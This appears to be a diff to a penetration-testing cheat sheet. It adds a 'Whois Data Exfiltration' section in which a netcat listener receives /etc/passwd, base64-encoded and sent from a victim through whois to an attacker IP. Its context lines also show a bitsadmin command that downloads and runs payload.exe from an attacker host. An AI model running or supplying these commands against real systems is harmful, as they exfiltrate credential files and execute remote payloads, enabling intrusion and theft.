@@ -521,6 +521,15 @@ wine /usr/share/windows-binaries/exe2bat.exe /root/tools/netcat/nc.exe nc.txt
 cmd.exe /c "bitsadmin /transfer myjob /download /priority high http://$ATTACKER/payload.exe %tmp%\payload.exe&start %tmp%\payload.exe
 ```
 
+### Whois Data Exfiltration
+
+```bash
+# attacker
+nc -l -v -p 43 | sed "s/ //g" | base64 -d
+# victim
+whois -h $attackerIP -p 43 `cat /etc/passwd | base64`
+```
+
 ### Bash Ping Sweeper
 
 ```bash
